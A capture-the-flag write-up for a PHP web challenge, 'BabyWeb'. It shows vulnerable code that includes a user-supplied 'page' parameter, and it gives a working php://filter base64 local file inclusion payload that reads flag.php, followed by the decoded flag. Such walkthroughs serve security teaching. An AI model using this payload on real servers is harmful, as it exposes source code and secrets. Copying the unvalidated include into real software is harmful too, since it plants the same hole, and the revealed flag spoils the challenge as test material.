# SOLUTION

If you get the response for the index of `http://wargame:8080`.

```html
<html>
<head>
<title>BabyWeb</title>
</head>
<body>
<div align="center">
<h1>BabyWeb</h1>
<p>Quotes from your favourite books!</p>
<hr>
<div>
<em>
Please select a book.</em>
</div>
<a href="?page=harry">Harry Potter</a>
<a href="?page=twilight">Twilight</a>
<a href="?page=tiffanys">Breakfast at Tiffany's</a>
<a href="?page=iliad">The Iliad</a>
<hr>
<em>The flag is in flag.php</em>
</div>
</body>
</html>
```

If we click on a link, it sends us to a page like
`http://wargame:8080/?page=harry`.

```html
<html>
<head>
<title>BabyWeb</title>
</head>
<body>
<div align="center">
<h1>BabyWeb</h1>
<p>Quotes from your favourite books!</p>
<hr>
<div>
<em>
It is our choices, Harry, that show what we truly are, far more than our abilities.</em>
</div>
<a href="?page=harry">Harry Potter</a>
<a href="?page=twilight">Twilight</a>
<a href="?page=tiffanys">Breakfast at Tiffany's</a>
<a href="?page=iliad">The Iliad</a>
<hr>
<em>The flag is in flag.php</em>
</div>
</body>
</html>
```

What changes is the quote. This is the PHP source code relevant to the quote
changing:

```php
<?php

chdir("includes");

if (!isset($_GET["page"])) {
    $quote = "Please select a book.";
}

include($_GET["page"] . ".php");

echo($quote);

?>
```

There is a local file inclusion vulnerability in the code. This allows us to
grab the source code of `flag.php` with this bug. The solution would be to use
the following link:
`http://wargame:8080/?page=php://filter/convert.base64-encode/resource=flag`.

This gives the following response:

```html

<html>
<head>
<title>BabyWeb</title>
</head>
<body>
<div align="center">
<h1>BabyWeb</h1>
<p>Quotes from your favourite books!</p>
<hr>
<div>
<em>
PD9waHAKCiRxdW90ZSA9ICJUaXMgbm90IHNvIGVhc3kuIFRoZSBmbGFnIGlzIGluIGEgY29tbWVudC4iOwoKLy8gRmxhZzogdHIxY2sxbmdfcGhwXzFudDBfZzF2MW5nX3kwdV90aDFuZ3MKCj8+Cg==</em>
</div>
<a href="?page=harry">Harry Potter</a>
<a href="?page=twilight">Twilight</a>
<a href="?page=tiffanys">Breakfast at Tiffany's</a>
<a href="?page=iliad">The Iliad</a>
<hr>
<em>The flag is in flag.php</em>
</div>
</body>
</html>
```

Decoding the base64 code yields the following:

```php
<?php

$quote = "Tis not so easy. The flag is in a comment.";

// Flag: tr1ck1ng_php_1nt0_g1v1ng_y0u_th1ngs

?>
```
